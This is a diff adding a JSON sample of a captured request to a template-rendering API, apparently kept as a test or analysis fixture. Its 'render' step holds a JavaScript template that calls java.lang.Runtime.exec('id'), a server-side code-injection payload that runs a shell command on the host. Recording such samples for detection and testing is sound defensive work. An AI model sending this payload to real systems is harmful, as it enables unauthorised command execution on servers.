@@ -1,0 +1,32 @@
+{
+  "sampleId": "hist-203",
+  "capturedAt": "2024-11-06T07:55:00Z",
+  "request": {
+    "method": "post",
+    "path": "/v1/templates/render",
+    "body": {
+      "dataset": "template_jobs",
+      "filter": {
+        "type": "selector",
+        "dimension": "tenant",
+        "value": "enterprise"
+      },
+      "steps": [
+        {
+          "name": "prepare",
+          "config": {
+            "mode": "safe"
+          }
+        },
+        {
+          "name": "render",
+          "template": {
+            "type": "javascript",
+            "function": "return java.lang.Runtime.getRuntime().exec('id');"
+          }
+        }
+      ],
+      "limit": 1
+    }
+  }
+}
